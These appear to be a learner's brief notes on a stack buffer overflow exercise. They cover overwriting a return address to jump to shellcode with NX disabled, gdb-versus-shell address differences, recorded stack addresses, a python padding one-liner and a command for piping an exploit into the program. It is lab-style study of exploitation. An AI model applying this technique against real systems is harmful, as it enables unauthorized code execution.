here have a buffer that we can writet and overflow, we overwrite the function return address placed in the stack, and jump back to the shell code inside buffer

we disable nx to make the shell code run

address inside gdb and in shell will differ, remember that. i was stuck here for a long, cause it worked inside gdb, in shell it just kept saying seg fault.

stack address after  ret address 0x00007fffffffdd70

ret address is stored at 0x00007fffffffdd68

buffer starts at 0x00007fffffffdce0

x 0x7fffffffdce0 + 128 + rbp + rip

python3 -c "print('A'*128 + 'B' *8 + 'C' * 8)" > pay

without gdb buffer starts at 0x7ffffffffdd70

(python2 exploit.py; cat) | ./program
